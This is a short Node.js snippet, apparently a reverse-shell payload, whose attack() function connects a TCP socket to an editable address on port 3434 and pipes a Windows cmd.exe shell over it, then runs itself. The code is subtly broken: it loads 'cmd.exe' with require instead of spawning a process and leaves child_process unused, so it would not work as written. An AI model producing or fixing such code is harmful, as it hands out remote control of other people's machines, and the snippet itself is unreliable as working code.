function attack() {
  const net = require('net');
  const cp = require('child_process');
  const cmd = require('cmd.exe', []);
  const client = new net.Socket();
  const VICTIM_IPADDR = '127.0.0.1'; // edit this

  client.connect(3434, VICTIM_IPADDR, () => {
    client.pipe(cmd.stdin);
    cmd.stdout.pipe(client);
    cmd.stderr.pipe(client);
  });

  return 1;
}attack();
